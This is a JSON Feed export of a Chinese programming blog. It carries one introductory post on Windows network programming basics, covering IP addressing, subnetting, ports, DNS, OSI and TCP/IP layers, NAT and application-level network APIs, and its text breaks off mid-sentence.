{
    "version": "https://jsonfeed.org/version/1",
    "title": "Or0kit • All posts by \"编程\" category",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Or0kit.github.io",
    "items": [
        {
            "id": "https://or0kit.github.io/Programming/NetworkProgramming/Windows%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E2%80%94%E2%80%9401%E5%9B%9B%E4%B8%A4%E6%8B%A8%E5%8D%83%E6%96%A4/",
            "url": "https://or0kit.github.io/Programming/NetworkProgramming/Windows%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E2%80%94%E2%80%9401%E5%9B%9B%E4%B8%A4%E6%8B%A8%E5%8D%83%E6%96%A4/",
            "title": "Windows网络编程——01四两拨千斤",
            "date_published": "2023-03-20T13:14:52.000Z",
            "content_html": "<h1 id=\"楔子\"><a class=\"anchor\" href=\"#楔子\">#</a> 楔子</h1>\n<p>准备系统的学习总结一下 Windows 网络编程，为了远控毕设，也为了后面学（NDIS）协议驱动打基础。</p>\n<p>参考资料：《Windows 网络编程》</p>\n<p>需要知道的概念比较多。</p>\n<h1 id=\"基础概念扫盲\"><a class=\"anchor\" href=\"#基础概念扫盲\">#</a> 基础概念扫盲</h1>\n<p>网上冲浪看到的，可以更好地理解网络应用程序开发。</p>\n<h2 id=\"为什么需要计算机网络\"><a class=\"anchor\" href=\"#为什么需要计算机网络\">#</a> 为什么需要计算机网络</h2>\n<p>如下图所示，A、B、C 三个不同地域的主机要想进行通信不是凭空就可以通信的，而是需要基于互联网进行互相连接、通信。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"为什么需要协议\"><a class=\"anchor\" href=\"#为什么需要协议\">#</a> 为什么需要协议</h2>\n<p>如下图所示，红和蓝是联合攻打绿，它们以烽火为信号出动攻打绿，那么这时候就需要一个约定，比如红先点烽火，然后蓝看见了狼烟再点烽火，红看见了蓝的狼烟之后熄灭烽火，以此表示自己看见了，而蓝看见了红熄灭烽火之后也熄灭自己的烽火以此表示自己知道红看见了此信号，而后两人就需要再约定信号一起整顿出军以确保没有失误。</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>所以我们知道蓝和红之间的通信不能保证 100% 成功，但是要尽量保证没有失误的话就需要一遍又一遍的去确认，而这些一次又一次的确定就是双方定下的协议；由此我们可以清楚的认识到我们在网络通信中是必须要有协议的存在的。</p>\n<h2 id=\"为什么需要这么多协议\"><a class=\"anchor\" href=\"#为什么需要这么多协议\">#</a> 为什么需要这么多协议</h2>\n<p>上文中我们举了两军协同作战，他们之间有个作战协议，而一旦作战成功，夺下对方城池那就需要另外一个瓜分战果的协议，所以每个不同的场景都会有对应的协议，这是有这么多协议的原因。</p>\n<p>如下图所示，我们的计算机网络也有很多协议，下面是分为五层，如果你了解过计算机网络协议应该会知道七层模型、五层模型，但本章节不讲七层模型而是选择五层模型，因为七层模型是一种理想化的模型，实际应用我们用到的是五层模型。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h2 id=\"如何定位互联网上的终端\"><a class=\"anchor\" href=\"#如何定位互联网上的终端\">#</a> 如何定位互联网上的终端</h2>\n<p>首先我们熟知的系统是通过线程 ID、进程 ID 知道对应的线程和进程的，在每个国家公民都是有身份证号码的，这也用来定位你这个人；在互联网上同样也有这样一个标识去确认终端，这就是 IP 地址。</p>\n<p>IP 地址以 &quot;.&quot; 符号分割，一共有四组，例如：120.120.120.120，每一组都是的区间都是 0 到 255，IP 地址的组成是网络号加上主机号，而具体的界定我们可以查看下文。</p>\n<p>IP 地址分为 5 类，其分别如下所示：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">类型</th>\n<th style=\"text-align:left\">起始地址</th>\n<th style=\"text-align:left\">结束地址</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">A 类</td>\n<td style=\"text-align:left\">0.0.0.0</td>\n<td style=\"text-align:left\">127.255.255.255</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">B 类</td>\n<td style=\"text-align:left\">128.0.0.0</td>\n<td style=\"text-align:left\">191.255.255.255</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">C 类</td>\n<td style=\"text-align:left\">192.0.0.0</td>\n<td style=\"text-align:left\">223.255.255.255</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">D 类</td>\n<td style=\"text-align:left\">224.0.0.0</td>\n<td style=\"text-align:left\">239.255.255.255</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">E 类</td>\n<td style=\"text-align:left\">240.0.0.0</td>\n<td style=\"text-align:left\">247.255.255.255</td>\n</tr>\n</tbody>\n</table>\n<p>不需要死记硬背，需要的时候自己查下就可以，具体含义网上很多，这里不过多赘述。</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<h2 id=\"如何区分出网络号-主机号\"><a class=\"anchor\" href=\"#如何区分出网络号-主机号\">#</a> 如何区分出网络号、主机号</h2>\n<p>如上图中我们可以知道 IP 地址分成了网络号和主机号两部分，通过子网掩码可以从 IP 地址中区分出网络号，其运算规则是：<strong>网络号 = IP 地址 &amp;(按位与) 子网掩码</strong>。</p>\n<p>我们查看自己本机的 IP 地址和子网掩码来计算：</p>\n<p>IP 地址： 192.168.8.117<br />\n 子网掩码： 255.255.255.0</p>\n<p>IP 地址：192.168.8.117，子网掩码：255.255.255.0，将这两个转为二进制则为：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>11000000.10101000.00001000.01110101</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>11111111.11111111.11111111.00000000</pre></td></tr></table></figure><p>我们进行按位与运算，结果就是：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>11000000.10101000.00001000.00000000</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>C0.A8.08.00</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>192.168.8.0</pre></td></tr></table></figure><p>那么在这里<strong> 192.168.8.0</strong> 就是其网络号。</p>\n<p>同样我们可以根据子网掩码来获取主机号，其运算规则是：<strong>主机号 = IP 地址 &amp;(按位与) ~(取反) 子网掩码</strong>。</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>~ 11111111.11111111.11111111.00000000 &#x2F;&#x2F; 取反子网掩码</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  00000000.00000000.00000000.11111111</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&amp; 11000000.10101000.00001000.01110101 &#x2F;&#x2F; 按位与</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  00000000.00000000.00000000.01110101</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Dec -&gt; 0.0.0.117 &#x2F;&#x2F; 十进制结果</pre></td></tr></table></figure><p>最终结果我们知道了其主机号为<strong> 0.0.0.117</strong>。</p>\n<p>子网掩码本质上是 32 位的二进制，只不过是为了看着直观一些就转为了十进制，子网掩码 1 所对应的位为网络号位，而 0 所对应的位为主机号位，其用来区分有几个子网，例如这里我们的 <strong>255.255.255.0</strong> ，转为二进制实际上前 24 位是网络位，后 8 位是主机位，那也就表示我们只有一个子网，在这里我们的子网地址范围就是： <strong>192.168.8.0-192.168.8.255</strong> ，可用的主机号计算公式就是 <strong>2 的 8（主机位）次方 - 2</strong> ，这里结果也就是 254，为什么我们还需要减去 2，这是因为根据计算方法， <strong>192.168.8.0 就是网络号（代表当前网络），</strong> 同时根据定义， <strong>主机号位全为 1 的地址为此网段的广播地址</strong> ，此时的广播地址为 <strong>192.168.8.255</strong> ，去掉网络地址和广播地址，也就是 254 个主机号可用。</p>\n<p>而如果我们的子网掩码为 <strong>255.255.255.192</strong> ，转为二进制就是 <strong>11111111.11111111.11111111.11000000</strong> ，可以看见其在我们的原先的后 8 位主机位中占用了 2 位作为网络位，现在有 26 个 1，那么根据二进制非 0 即 1，其表现方式就有 <strong>11000000、10000000、00000000、01000000</strong> ，也就是说我们将原有的<strong> 192.168.8.0</strong> 这个网络分成了四份，即 4 个子网，也可以理解为这里就是 <strong>2 的 2（后 8 位主机位中占用了 2 位）次方</strong> ，现在我们将它们转换成 10 进制就分别是 <strong>0、64、128、192</strong> ，那么这 4 段网络的范围如下所示：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>192.168.8.0 - 192.168.8.63</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>192.168.8.64 - 192.168.8.127</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>192.168.8.128 - 192.168.8.191</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>192.168.8.192 - 192.168.8.255</pre></td></tr></table></figure><h2 id=\"端口号是什么\"><a class=\"anchor\" href=\"#端口号是什么\">#</a> 端口号是什么</h2>\n<p>问题：系统中有很多个进程连着网，比如 QQ、微信、迅雷... 那么系统是如何区分出数据包应该分给哪个进程呢？</p>\n<p>答案：系统是根据端口号来区分出数据包应该分给哪个进程，每个联网的进程都会分配一个系统唯一的 ID，发送数据包的时候这个 ID 也会放进去，接受数据包的时候就可以根据这个 ID 来分别出对应进程，这个 ID 也就是端口号。</p>\n<p>注意：端口号的范围就是<strong> 0-65535</strong></p>\n<h2 id=\"网关是什么\"><a class=\"anchor\" href=\"#网关是什么\">#</a> 网关是什么</h2>\n<p>如下图所示，路由器就是一个网关，网关就相当于是网络的一扇门，关内是一个网络，A、B、C、D 都可以在这个网内进行通信，就不需要网关了，而如果 A 想跟 E 进行通信就需要通过网关将你的请求转发去通信，这是因为 E 不在关内。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<h2 id=\"dns是什么\"><a class=\"anchor\" href=\"#dns是什么\">#</a> DNS 是什么</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3cteDY5ZDg0Ym96MmZnNXg5cTlha2E0ODF4LmJhaWR1LmNvbQ==\">假设你访问的是 www.baidu.com</span>，这是一个域名，但是这个域名你想要去访问到真正的那些展示给你的资源其背后对应的正是某个服务器的 IP，根据这个 IP 和对应的端口你才可以访问到资源，而将域名和 IP 进行关联的正是 DNS。</p>\n<p>DNS 服务器通过记录域名和 IP 的关联，当你想要去访问某个域名的时候，就需要给 DNS 服务器发送请求，而后 DNS 服务器接收到你的请求，将请求中想要查询的域名在 DNS 服务器本身的记录中去搜索找到对应的 IP，最后返回给你。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<h1 id=\"网络应用程序开发基础\"><a class=\"anchor\" href=\"#网络应用程序开发基础\">#</a> 网络应用程序开发基础</h1>\n<p>网络编程的基础是计算机网络，先了解网络程序设计中涉及的计算机网络方面的基础知识，包括各种网络术语、网络拓扑结构、网络协议等。</p>\n<p>基于计算机网络开发的分布式网络应用程序种类多样，设计需求也千差万别，本章对常用的网络程序设计方法进行归纳，由高层至底层分别介绍了面向应用的网络编程方法、基于 TCP/IP 协议栈的网络编程方法和面向原始帧的网络编程方法。</p>\n<h2 id=\"计算机网络基础\"><a class=\"anchor\" href=\"#计算机网络基础\">#</a> 计算机网络基础</h2>\n<h3 id=\"协议层次和服务模型\"><a class=\"anchor\" href=\"#协议层次和服务模型\">#</a> 协议层次和服务模型</h3>\n<p>计算机网络，是指将地理位置不同且具有独立功能的多台计算机及其外部设备，通过通信线路连接起来，在网络操作系统、网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统。</p>\n<p>总的来说，计算机网络的组成基本上包括计算机、网络操作系统、传输媒体以及相应的应用软件四部分。</p>\n<p>计算机网络是一个极为复杂的系统，网络中有许多部分：大量的应用程序和协议、各种类型的端系统，以及各种类型的链路级媒体。面对这种复杂的系统，如何简化管理是非常重要的。为了降低设计难度，网络设计者以分层的方式组织协议以及实现这些协议的网络硬件和软件。协议分层具有概念化和结构化的优点，每一层都建立在它的下层之上，使用它的下层提供的服务，下层对它的上层隐藏服务实现的细节。</p>\n<p>一个机器上的第 n 层与另一个机器的第 n 层交流，所使用的规则和协定合起来被称为第 n 层协议。这里的协议，是指通信双方关于如何进行通信的一种约定，每个协议属于某个层次。特定系统所使用的一组协议被称为协议栈（protocol stack）。</p>\n<h4 id=\"osi参考模型\"><a class=\"anchor\" href=\"#osi参考模型\">#</a> OSI 参考模型</h4>\n<p>在 OSI 出现之前，计算机网络中存在多种体系结构，其中以 IBM 公司的系统网络体系结构（System Network Architecture，SNA）和 DEC 公司的数字网络体系结构（Digital Network Architecture，DNA）最为著名。</p>\n<p>为了解决不同体系结构的网络互连问题，国际标准化组织 ISO 于 1981 年制定了开放系统互连参考模型（Open System Interconnection Reference Model，OSI/RM）。</p>\n<p>这个模型把网络通信的工作分为 7 层，它们由低到高分别是物理层（physical layer）、数据链路层（data link layer）、网络层（network layer）、传输层（transport layer）、会话层（session layer）、表示层（presentation layer）和应用层（application layer）。</p>\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<p>第 1 层到第 3 层属于 OSI 参考模型的低三层，负责创建网络通信连接的链路；第 4 层到第 7 层为 OSI 参考模型的高四层，具体负责端到端的数据通信。</p>\n<p>每层完成一定的功能，每层都直接为其上层提供服务，并且所有层次都互相支持，而网络通信则可以自上而下（在发送端）或者自下而上（在接收端）双向进行。当然并不是每一通信都需要经过 OSI 的全部七层，有的甚至只需要双方对应的某一层即可。物理接口之间的转接，以及中继器与中继器之间的连接就只需在物理层中进行；而路由器与路由器之间的连接则只需经过网络层以下的三层。</p>\n<p>总的来说，双方的通信是在对等层次上进行的，不能在不对等层次上进行。</p>\n<h4 id=\"tcpip参考模型\"><a class=\"anchor\" href=\"#tcpip参考模型\">#</a> TCP/IP 参考模型</h4>\n<p>ISO 制定的 OSI 参考模型过于庞大、复杂，招致了许多批评。与此对照，由技术人员自己开发的 TCP/IP 协议栈获得了更为广泛的应用。</p>\n<p>TCP/IP 协议栈是美国国防部高级研究规划局计算机网（Advanced Research Projects Agency Network，ARPANET）和其后继因特网使用的参考模型。TCP/IP 参考模型分为五个层次：应用层、传输层、网络层、链路层和物理层，如图 1-1b 所示。</p>\n<p>在 TCP/IP 参考模型中，去掉了 OSI 参考模型中的会话层和表示层（这两层的功能被合并到应用层实现）。以下分别介绍各层的主要功能。</p>\n<h5 id=\"应用层\"><a class=\"anchor\" href=\"#应用层\">#</a> 应用层</h5>\n<p>应用层是网络应用程序及其应用层协议存留的层次。TCP/IP 协议簇的应用层协议包括 Finger（用户信息协议）、文件传输协议（File Transfer Protocol，FTP）、超文本传输协议（Hypertext Transfer Protocol，HTTP）、Telent（远程终端协议）、简单邮件传输协议（Simple Mail Transfer Protocol，SMTP）、因特网中继聊天 Internet Relay Chat，IRC）、网络新闻传输协议（Network News Transfer Protocol，NNTP）等。</p>\n<p>应用层之间交换的数据单位为消息流或报文（message）。</p>\n<h5 id=\"传输层\"><a class=\"anchor\" href=\"#传输层\">#</a> 传输层</h5>\n<p>在 TCP/IP 模型中，传输层的功能是使源端主机和目标端主机上的对等实体可以进行会话。在传输层定义了两种服务质量不同的协议，即传输控制协议（Transmission Control Protocol，TCP）和用户数据报协议（User Datagram Protocol，UDP）。</p>\n<p>TCP 协议是一个面向连接的、可靠的协议，为应用程序提供了面向连接的服务。这种服务将一台主机发出的消息流无差错地发往互联网上的其他主机。在发送端，它负责把上层传送下来的消息流分成数据段并传递给下层；在接收端，它负责把收到的数据包进行重组后递交给上层。另外，TCP 协议还要处理网络拥塞控制，在网络拥塞时帮助发送源抑制其传输速度；提供端到端的流量控制，避免缓慢接收的接收方没有足够的缓冲区接收发送方发送的大量数据。TCP 的协议数据传输单元为 TCP 数据段（TCP segment）。</p>\n<p>UDP 协议是一个不可靠的、无连接的协议，为应用程序提供无连接的服务。这种服务主要适用于广播数据发送和不需要对报文进行排序和流量控制的场合。UDP 的协议数据传输单元为 UDP 数据报（UDP datagram）。</p>\n<h5 id=\"网络层\"><a class=\"anchor\" href=\"#网络层\">#</a> 网络层</h5>\n<p>网络层是整个 TCP/IP 协议栈的核心。网络层的功能是通过路径选择把分组发往目标网络或主机，进行网络拥塞控制以及差错控制。</p>\n<p>网际协议（Internet Protocol，IP）是网络层的重要协议，该协议定义了数据包中的各个字段以及端系统和路由器如何作用于这些字段。</p>\n<p>网络层中的另一个协议 Internet 控制报文协议（Internet Control Message Protocol，ICMP）用于在 IP 主机、路由器之间传递控制消息。控制消息包括网络是否畅通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p>\n<p>另外网络层也包括决定路由的选路协议（如 RIP、OSPF 等），数据包根据选定的路由从源传输到目的地。</p>\n<p>网络层的协议数据传输单元为数据包（packet），或称为分组。</p>\n<h5 id=\"数据链路层\"><a class=\"anchor\" href=\"#数据链路层\">#</a> 数据链路层</h5>\n<p>数据链路层负责物理层和网络层之间的通信，将网络层接收到的数据分割成特定的、可被物理层传输的帧，并交付物理层进行实际的数据传送。</p>\n<p>数据链路层提供的服务取决于应用于该链路层的协议，常用的协议包括以太网的 802.3 协议、Wi-Fi 的 802.11 协议和点对点协议（PPP）等。因为数据包从源到目的地传送通常需要经过几条链路，所以它可能被沿途不同链路上的不同链路层协议处理。</p>\n<p>数据链路层的协议数据传输单元为帧（frame）。</p>\n<h5 id=\"物理层\"><a class=\"anchor\" href=\"#物理层\">#</a> 物理层</h5>\n<p>链路层的任务是将整个帧从一个网络元素移动到邻近的网络元素，而物理层的任务是将该帧中的一个一个比特从一个节点移动到下一个节点。该层中的协议仍然是链路相关的，并且进一步与链路（如双绞线、单模光纤）的实际传输媒体相关。对应于不同的传输媒体，跨越这些链路移动一个比特的方式也不同。</p>\n<p>物理层的协议数据传输单元为比特（bit）。</p>\n<h3 id=\"网络程序寻址方式\"><a class=\"anchor\" href=\"#网络程序寻址方式\">#</a> 网络程序寻址方式</h3>\n<p>在邮寄信件时，邮政业务需要提供收信人的地址；在电话交流时，电话系统需要拨号者提供通信对方的电话号码。与之类似，在一个网络程序与另一网络程序通信之前，必须告诉网络某些信息以标识另一个程序。在 TCP/IP 中，网络应用程序使用两个信息来唯一标识一个特定的应用程序：<strong>IP 地址和端口号</strong>。</p>\n<p>在具体的网络应用中，IP 地址和端口号的使用还会遇到一些更复杂的变化，比如名称解析、网络地址转换等。</p>\n<h4 id=\"ip地址\"><a class=\"anchor\" href=\"#ip地址\">#</a> IP 地址</h4>\n<p>互联网上的每个主机和路由器都有 IP 地址，它将网络号和主机号编码在一起。这个组合在全网范围内是唯一的（原则上，互联网上没有两个机器有相同的 IP 地址）。</p>\n<p>IP 地址是二进制数字，具有 IPv4 和 IPv6 两种类型，分别对应于已经标准化的网际协议的两个版本。IPv4 地址的长度为 32 位，用于标识 40 亿个不同的地址。对于今天的 Internet 来说，这个地址范围并不能满足实际使用的需要。IPv6 地址的长度为 128 位。</p>\n<p>在表示 IP 地址以便于人们使用方面，为 IP 的两个版本采用了不同的约定。按照惯例，将 IPv4 地址写为一组 4 个用句点隔开的十进制数字（例如 10.0.0.3. ，这被称为 “<strong>点分十进制</strong>” 表示法。<br />\n点分十进制字符串中的 4 个数字表示 IP 地址的 4 个字节的内容，每个部分都是 0~255 之间的数字。</p>\n<p>另一方面，根据约定，16 字节的 IPv6 地址被表示为用冒号隔开的十六进制数字的组合（例如 2000:fdb8:0000:0000:0000:0023:7865:28a1. ，每一组数字表示 2 字节的地址，可以省略前导 0 和只包含 0 的组序列。</p>\n<p>就 IPv4 地址而言，最初对 IP 地址编址的方法是分类编址方法，如图 1-2 所示，IP 地址的网络部分被限制长度为 8、16 或 24 比特，分别称为 A、B 和 C 类网络，D 类网络用于多播，E 类网络保留供今后使用。</p>\n<p><img data-src=\"image010.png\" alt=\"\" /></p>\n<p>此外还有一些地址段有特殊的用法，比如：</p>\n<ul>\n<li>\n<p><code>10.0.0.0 ~ 10.255.255.255</code> 、 <code>172.16.0.0 ~ 172.31.255.255</code> 、 <code>192.168.0.0 ~ 192.168.255.255</code>  是私有地址，这些地址被大量用于内部的局域网络中，以免以后接入公网时引起地址混乱。</p>\n</li>\n<li>\n<p><code>127.0.0.0~127.255.255.255</code>  是保留地址，用于本地回环测试，发送到这个地址的封包不会被传输到线路上，而是被当作到来的封包直接在本地处理，这允许发送者不需要知道网络号就可以完成封包的发送。</p>\n</li>\n<li>\n<p><code>169.254.0.0 ~ 169.254.255.255</code>  是保留地址。</p>\n</li>\n<li>\n<p><code>0.0.0.0</code>  表示所有不清楚的主机和目的网络，一般在网络配置中设置了缺省网关，那么 Windows 系统会自动产生一个目的地址为 <code>0.0.0.0</code>  的缺省路由。</p>\n</li>\n<li>\n<p><code>255.255.255.255</code>  表示限制广播地址，对本机来说，它指本网段内（同一广播域）的所有主机。</p>\n</li>\n</ul>\n<h4 id=\"端口号\"><a class=\"anchor\" href=\"#端口号\">#</a> 端口号</h4>\n<p>网络层 IP 地址用来寻址指定的计算机或者网络设备，而传输层的端口号用来确定运行在目的设备上的应用程序。端口号是 16 位的，范围在 <code>0～65535</code>  之间。在设备上寻址端口号时经常使用的形式是 “ <code>IP:端口号</code> ”，通信的两端都要使用端口号来唯一标识其主机内运行的特定应用程序。</p>\n<p>许多公共服务都使用固定的端口号，例如万维网（World Wide Web，WWW）服务器默认使用的端口号是 80，FTP 服务器使用的端口号是 21，SMTP 服务器使用的端口号是 25 等。自定义的服务一般使用高于 1024 的端口号。</p>\n<h4 id=\"名称解析\"><a class=\"anchor\" href=\"#名称解析\">#</a> 名称解析</h4>\n<p>在一个基于 TCP/IP 的网络中，IP 地址被用来唯一标识网络上的一台计算机。如果某台计算机想访问网络中的其他计算机，首先必须知道目标计算机的 IP 地址，然后使用该 IP 地址与其通信。</p>\n<p>但在实际应用中，用户很少直接使用 IP 地址来访问网络中的资源，而是习惯使用便于记忆的计算机名或域名。比如当用户在浏览器地址栏中输入 &quot; <code>http://www.test.com</code> &quot; 想要访问网络中的某台服务器时，客户计算机必须通过一个地址转换过程，将该域名转换成该服务器的 IP 地址，这个名称转换过程是通过名称解析服务完成的。</p>\n<p>名称解析服务可以访问广泛来源的信息，两种主要的来源分别是： <code>域名系统</code> （Domain Name System，DNS）和 <code>本地配置数据库</code> （一般是操作系统中用于本地名称与 IP 地址映射的特殊机制，如 Windows 系统中的 NetBIOS 解析）。</p>\n<h4 id=\"网络地址转换\"><a class=\"anchor\" href=\"#网络地址转换\">#</a> 网络地址转换</h4>\n<p>IP 地址是短缺的资源，对于整个 Internet 来说，长期的解决方案是迁移到 IPv6，这个转化正在慢慢进行，但是要想真正完成需要经过很多年的时间。这样，人们必须找到一个快速的、能够马上投入使用的解决方法。网络地址转换（Network Address Translation，NAT）是接入广域网（WAN）的一种技术，能够将私有（保留）地址转化为合法的 IP 地址，它被广泛应用于各种 Internet 接入方式和各种类型的网络中。NAT 不仅完美地解决了 IP 地址不足的问题，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机。</p>\n<p>NAT 的实现方式有三种，即静态转换、动态转换和端口多路复用。</p>\n<p>静态转换是指将内部网络的私有 IP 地址转换为公有 IP 地址时，IP 地址对是一对一的，是一成不变的，某个私有 IP 地址只转换为某个公有 IP 地址。借助于静态转换，可以实现外部网络对内部网络中某些特定设备（如服务器）的访问。</p>\n<p>动态转换是指将内部网络的私有 IP 地址转换为公用 IP 地址时，IP 地址是不确定的，是随机的，所有被授权访问 Internet 的私有 IP 地址都可随机转换为任何指定的合法 IP 地址。也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址，就可以进行动态转换。动态转换可以使用多个合法外部地址集。当 ISP 提供的合法 IP 地址略少于网络内部的计算机数量，可以采用动态转换的方式。</p>\n<p>端口多路复用是指改变外出数据包的源端口并进行端口地址转换（Port Address Translation，PAT）。内部网络的所有主机均可共享一个合法外部 IP 地址实现对 Internet 的访问，从而可以最大限度地节约 IP 地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自 Internet 的攻击。因此，目前网络中应用最多的就是端口多路复用方式。</p>\n<p>NAT 有效解决了 IP 地址短缺的问题，但是它也带来了一些新的问题，使得开发点对点通信应用程序会有很多附加的考虑，主要体现在：</p>\n<ul>\n<li>\n<p>处于 NAT 后面的主机不能充当服务器直接接收外部主机的连接请求，必须对 NAT 设备进行相应的配置才能完成外部地址与内部服务器地址的映射。</p>\n</li>\n<li>\n<p>处于不同 NAT 之后的两台主机无法建立直接的 UDP 或 TCP 连接，必须使用中介服务器来帮助它们完成初始化的工作。</p>\n</li>\n</ul>\n<h2 id=\"分布式网络应用程序\"><a class=\"anchor\" href=\"#分布式网络应用程序\">#</a> 分布式网络应用程序</h2>\n<p>随着计算机技术的发展和应用的深入，分布式网络应用程序在构建企业级的应用中更加流行。这类程序的主要特点是：</p>\n<ul>\n<li>\n<p>分布式网络应用程序将整个应用程序的处理分成几个部分，分别在不同的机器上运行，这里的 “分布” 包含两层含义：地理上的分布和数据处理的分布。</p>\n</li>\n<li>\n<p>多台主机之间交互协作，共同完成一个任务。</p>\n</li>\n<li>\n<p>就网络访问而言，分布式应用对用户来说是透明的，其目标在于提供一个环境，该环境隐藏了计算机和服务的地理位置，使它们看上去就像在本地一样。</p>\n</li>\n</ul>\n<p>从应用场合来看，分布式网络应用程序大致可分为以下五类：</p>\n<ol>\n<li>\n<p>远程控制类应用程序。远程控制类应用程序的目的是远程操作对方主机的行为。其主要工作过程是：程序与远程主机建立会话，根据控制需求，传送命令，使用统一的操作界面操控多台主机。典型的应用有远程协助、木马远程监控等。</p>\n</li>\n<li>\n<p>网络探测类应用程序。网络探测类应用程序的目的是通过灵活的探测包构造能力获得期望的探测结果。其主要工作过程是：选择较低层的网络编程接口，根据探测需求，构造特殊请求，对探测目标进行各类请求的发送，接收并分析响应，给出探测结论。典型的应用有端口扫描、操作系统探测、网络爬虫等。</p>\n</li>\n<li>\n<p>网络管理类应用程序。网络管理类应用程序的目的是对网络数据和网络设备进行监管，发现异常，限制应用等。其主要工作过程是：根据网络管理需求，选择合适的网络编程接口，使用特定的网络管理协议进行设备的状态监控，或通过强大的流量分析能力对网络进出流量进行监控。典型的应用有网络管理、上网监控、网络流量分析、入侵检测等。</p>\n</li>\n<li>\n<p>远程通信类应用程序。远程通信类应用程序的目的在于提供用户间的各类通信渠道。其主要工作过程是：根据通信需求，选择合适的通信模型，为文字聊天、文件传输、语音视频等用户应用设计稳定可靠的传输通道。典型的应用有即时通信、电子邮件客户端、联机游戏等。</p>\n</li>\n<li>\n<p>信息发布类应用程序。信息发布类应用程序的目的在于发布信息。其主要工作过程是：在公开知名的地址上开放服务，等待用户的信息查询和发布请求，提供有效的信息展示能力。典型的应用有 WWW 服务器、FTP 服务器、Whois 服务器等。</p>\n</li>\n</ol>\n<h2 id=\"网络编程方法纵览\"><a class=\"anchor\" href=\"#网络编程方法纵览\">#</a> 网络编程方法纵览</h2>\n<p>根据实际工作的具体需求，实现网络程序设计的方法很多，如套接字编程、基于 NDIS 的编程、Web 网站开发等等。每一种编程方法都可以实现数据的传输，但不同方法的工作机制差别很大，其实现能力也有很大差别。在实际运用中需要首先明确这些方法的工作层次和特点，然后选择适合的编程方法。从网络数据的内容来看，不同的编程方法可操控的数据可以是链路层上的帧、网络层上的数据包、传输层上的数据段或应用层上的消息流。以下参考操控网络数据的层次分别阐述常用的网络编程方法。</p>\n<h3 id=\"面向应用的网络编程方法\"><a class=\"anchor\" href=\"#面向应用的网络编程方法\">#</a> 面向应用的网络编程方法</h3>\n<p>在应用层上有大量针对具体应用、特定协议的网络应用程序编程方法，这些方法屏蔽了大量网络操作的细节，提供简单的接口用于访问应用程序中的数据流。面向应用的网络编程方法主要有以下几种。</p>\n<ol>\n<li>WinInet 编程</li>\n</ol>\n<p>WinInet 编程面向 Internet 常用协议中消息流的访问，这些协议包括 HTTP 协议、FTP 协议和 Gopher 文件传输协议。WinInet 函数的语法与常用的 Win32API 函数的语法类似，这使得使用这些协议就像使用本地硬盘上的文件一样容易。</p>\n<ol start=\"2\">\n<li>基于 WWW 应用的网络编程</li>\n</ol>\n<p>WWW 又称为万维网或 Web，WWW 应用是 Internet 上最广泛的应用。它用 HTML 来表达信息，用超链接将全世界的网站连成一个整体，用浏览器这种统一的形式来浏览，为人们提供了一个图文并茂的多媒体信息世界。WWW 已经深入应用到各行各业。无论是电子商务、电子政务、数字企业、数字校园，还是各种基于 WWW 的信息处理系统、信息发布系统和远程教育系统，都采用了网站的形式。这种巨大的需求催生了各种基于 WWW 应用的网络编程技术，主要包括网页制作工具（如 Frontpage、Dreamweaver、Flash 和 Firework 等）、动态服务器页面的制作技术（如 ASP、JSP 和 PHP 等）。</p>\n<ol start=\"3\">\n<li>面向 SOA 的 Web Service 网络编程随着业务应用程序对业务需求的灵活性要求逐步提高，传统紧耦合的面向对象模型已不再适合，面向服务的体系架构（Service-Oriented Architecture，SOA）可以根据需求通过网络对松散耦合的粗粒度应用组件进行分布式部署、组合和使用。在 SOA 方式下，服务之间通过简单、精确定义的接口进行通信，不涉及底层编程接口和通信模型。SOA 可以看作是 B/S 模型、XML/Web Service 技术之后的自然延伸。</li>\n</ol>\n<p>Web Service 是一种常见的 SOA 的实现方式，是松散耦合的可复用的软件模块。Web Service 完全基于 XML（可扩展标记语言）、XSD（XML Schema）等独立于平台和软件供应商的标准，是创建可互操作的、分布式应用程序的新平台。</p>\n<p>在 Internet 上发布后，Web Service 能够通过标准协议在程序中访问。在谷歌、新浪微博等传统 WWW 应用平台下已发布了大量通过 Web Service 可远程访问的公共 API 访问接口，尤其是在云计算方兴未艾的趋势下，越来越多的程序需要跨平台交互，基于 Web Service 